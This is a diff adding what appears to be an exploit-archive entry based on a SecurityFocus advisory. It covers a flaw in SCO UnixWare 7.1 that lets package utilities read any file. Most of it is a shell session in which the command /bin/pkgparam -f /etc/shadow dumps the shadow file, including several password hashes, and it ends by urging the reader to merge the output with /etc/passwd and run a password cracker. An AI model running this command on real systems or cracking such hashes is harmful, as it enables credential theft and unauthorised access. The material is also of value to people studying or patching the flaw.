@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/850/info
+
+Certain versions of SCO's Unixware (only version 7.1 was tested) ship with a series of package install/removal utilities which due to design issues under the SCO UnixWare operating system may read any file on the system regardless of their permission set. This is due to the package commands (pkginfo, pkgcat, pkgparam, etc.) having extended access due to Discretionary Access
+Controls (DAC) via /etc/security/tcb/privs. This mechanism is explained more thoroughly in the original message to Bugtraq which is listed in full in the 'Credit' section of this vulnerability entry.
+
+bash-2.02$ ls -la /bin/pkgparam
+-r-xr-xr-x 1 root sys 166784 May 21 1999
+/bin/pkgparam
+bash-2.02$ /bin/pkgparam -f /etc/shadow
+Dy0l3OC7XHsj.:10925::::::
+NP:6445::::::
+NP:6445::::::
+NP:6445::::::
+NP:6445::::::
+NP:6445::::::
+NP:6445::::::
+NP:6445::::::
+NP:6445::::::
+NP:6445::::::
+*LK*:::::::
+*LK*:::::::
+*LK*:::::::
+BgusHRQZ9MH2U:10878::::::
+*LK*:::::::
+*LK*:::::::
+*LK*:::::::
+*LK*:::::::
+*LK*:::::::
+nv.Xrh2V3vArc:10882::::::
+ozT.yeRe1/dxY:10882::::::
+RinwpQfqabYbc:10928::::::
+bash-2.02$
+
+Now just concatenate the first field of /etc/passwd with this file and run your favorite cracker.
